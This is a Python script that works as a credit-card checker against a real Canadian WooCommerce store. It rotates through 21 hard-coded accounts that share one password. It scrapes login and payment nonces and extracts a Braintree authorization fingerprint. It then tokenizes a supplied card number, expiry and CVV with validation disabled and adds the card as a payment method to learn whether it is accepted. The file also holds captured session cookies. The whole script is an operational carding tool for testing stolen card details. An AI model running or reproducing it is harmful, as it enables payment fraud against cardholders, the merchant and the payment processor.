import requests,re,base64,random,uuid
from bs4 import BeautifulSoup
# from proxy import proxies
def getstr( data, first, last ):
    try: 
        start = data.index( first ) + len( first ) 
        end = data.index( last, start ) 
        return data[start:end] 
    except ValueError: 
        return None

current_index = 0

def login_user():
    global current_index
    users = ['xaru1paewk', 'smith427', 'neighamyah', '05v77t2phnb', '5o0gzov0jf0', 
             'e6mcwg2dvxqi', 'db5p10txmn', 'jc2xv9a4c', 'y81jn5fr', 'ngcgx9ox', 
             '17hxno3kst', 'v18y4ddktw', 'ugppqt9dv', 'remrd6cy', 'qbcct9pnefrl',
             '0yf7kznh','tg5cenhw','4eizh2zlte','pfsy83zouvvu','pr1f83n7y0',
             'ubmnatkb4df']
    
    username = users[current_index]
    
    current_index = (current_index + 1) % len(users)
    
    return username



def b3_mona1(cc,mm,yy,cvv):
    r = requests.Session()
    user = login_user()
    # proxy = proxies()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}

    response = r.get('https://www.abnclean.ca/my-account/', headers=headers,)
    login = getstr(response.text, 'woocommerce-login-nonce" value="', '"')
    print(login)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'wp-wpml_current_language=en; _icl_visitor_lang_js=en; _tt_enable_cookie=1; _ttp=5wg5dxQLbPlHplbRqFbb3qFGjX6; cmplz_consented_services=; cmplz_policy_id=24; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_banner-status=dismissed; _ga=GA1.1.1038978904.1727431238; _gcl_au=1.1.275384192.1727431238.660376048.1727431251.1727432661; wordpress_test_cookie=WP%20Cookie%20check; wpml_browser_redirect_test=0; _ga_F0FEWM7JDM=GS1.1.1727431238.1.1.1727433223.0.0.0; _ga_YQ4GET3C2Z=GS1.1.1727431238.1.1.1727433795.40.0.0',
        'Origin': 'https://www.abnclean.ca',
        'Pragma': 'no-cache',
        'Referer': 'https://www.abnclean.ca/my-account/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'username': user,
        'password': 'Ayanpro@087',
        'woocommerce-login-nonce': login,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }

    response = r.post('https://www.abnclean.ca/my-account/',  headers=headers, data=data,)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; _gid=GA1.2.780145682.1727437854; wordpress_logged_in_c495dec138068408b4b4f3ecc02bd94d=smith427%7C1728647471%7COqOqWJlBodgnhez4rwKkhzOVmzoDhun9ASrT0v4qWau%7C52e74d9c0aee3df9fc2b1b3479588b582c4dbe34c2125e49e7c1e616de975f9e; _ga_PES4ZWSRFR=GS1.1.1727437853.1.1.1727438096.0.0.0; _ga=GA1.1.299008543.1727437854; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fedit-address%2F',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.abnclean.ca/my-account/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://www.abnclean.ca/my-account/payment-methods/', headers=headers)
    client_token = getstr(response.text, 'client_token_nonce":"', '"').strip()
    print(client_token)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        #'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; _gid=GA1.2.780145682.1727437854; wordpress_logged_in_c495dec138068408b4b4f3ecc02bd94d=smith427%7C1728647471%7COqOqWJlBodgnhez4rwKkhzOVmzoDhun9ASrT0v4qWau%7C52e74d9c0aee3df9fc2b1b3479588b582c4dbe34c2125e49e7c1e616de975f9e; _ga_PES4ZWSRFR=GS1.1.1727437853.1.1.1727438234.0.0.0; _ga=GA1.1.299008543.1727437854; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fpayment-methods%2F',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.abnclean.ca/my-account/payment-methods/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://www.abnclean.ca/my-account/add-payment-method/', headers=headers)
    add_payment_nonce = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
    print(add_payment_nonce)

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        #'cookie': 'wordpress_sec_c495dec138068408b4b4f3ecc02bd94d=smith427%7C1728647471%7COqOqWJlBodgnhez4rwKkhzOVmzoDhun9ASrT0v4qWau%7C62552b7ef1733635b9d5ebdc856068e5e57837821f5b2adef601c01f175b2c01; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; _gid=GA1.2.780145682.1727437854; wordpress_logged_in_c495dec138068408b4b4f3ecc02bd94d=smith427%7C1728647471%7COqOqWJlBodgnhez4rwKkhzOVmzoDhun9ASrT0v4qWau%7C52e74d9c0aee3df9fc2b1b3479588b582c4dbe34c2125e49e7c1e616de975f9e; _gat_gtag_UA_121887955_1=1; _ga_PES4ZWSRFR=GS1.1.1727437853.1.1.1727438362.0.0.0; _ga=GA1.1.299008543.1727437854; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://www.abnclean.ca',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token
    }

    response = r.post('https://www.abnclean.ca/wp-admin/admin-ajax.php', headers=headers, data=data).json()
    dec = base64.b64decode(response['data']).decode('utf-8')
    at = getstr(dec, '"authorizationFingerprint":"', '"')
    print(at)

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data,)

    token = response.json()['data']['tokenizeCreditCard']['token']
    print(token)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-27%2011%3A20%3A53%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Safari%2F537.36; _gid=GA1.2.780145682.1727437854; wordpress_logged_in_c495dec138068408b4b4f3ecc02bd94d=smith427%7C1728647471%7COqOqWJlBodgnhez4rwKkhzOVmzoDhun9ASrT0v4qWau%7C52e74d9c0aee3df9fc2b1b3479588b582c4dbe34c2125e49e7c1e616de975f9e; _ga_PES4ZWSRFR=GS1.1.1727437853.1.1.1727438708.0.0.0; _ga=GA1.1.299008543.1727437854; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.abnclean.ca%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://www.abnclean.ca',
        'pragma': 'no-cache',
        'priority': 'u=0, i',
        'referer': 'https://www.abnclean.ca/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'visa',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': add_payment_nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = r.post('https://www.abnclean.ca/my-account/add-payment-method/', headers=headers, data=data,)
    soup = BeautifulSoup(response.text, 'html.parser')
    error_message = soup.find('ul', class_='woocommerce-error')
    success_message = soup.find('div', class_='woocommerce-message')

    if error_message:
        error_text = error_message.get_text(strip=True)
        formatted_error = re.sub(r'Status code\s+', '', error_text)
        formatted_error = re.sub(r'\s+', ' ', formatted_error).strip()
        return formatted_error
    elif success_message:
        
        success_text = success_message.get_text(strip=True)
        return success_text
    else:
        return 'An unexpected error occurred while processing your payment.'

print(b3_mona1('4222240015136142','02','2033','225'))